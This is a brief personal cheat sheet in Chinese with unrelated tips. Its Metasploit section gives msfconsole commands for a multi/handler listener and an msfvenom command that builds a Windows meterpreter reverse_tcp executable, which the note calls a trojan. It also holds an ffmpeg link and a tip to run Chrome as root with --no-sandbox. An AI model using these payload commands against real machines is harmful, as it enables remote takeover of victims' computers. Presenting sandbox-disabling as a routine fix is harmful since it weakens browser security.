## msfconsole
use multi/handler
set LHOST IP
set LPORT 端口
exploit
开始监听

## msfvenom
`-l payloads` 回显所有可生成的木马
`-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f exe -o 路径` 可以在 msfconsole 中使用
## ffmpeg
一个视频提帧的应用
[https://www.jianshu.com/p/ddafe46827b7](https://www.jianshu.com/p/ddafe46827b7)
## root 用户
闪退：权限过高
`/opt/google/chrome/google-chrome`
最后一行添加 `--no-sandbox`

<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEwNTkxNDg3OCwyMDkyMjg4NjYwLDEyND
I0MjI1MTYsMTg4ODEwMTg4MSw3MzUxNjQ3NTJdfQ==
-->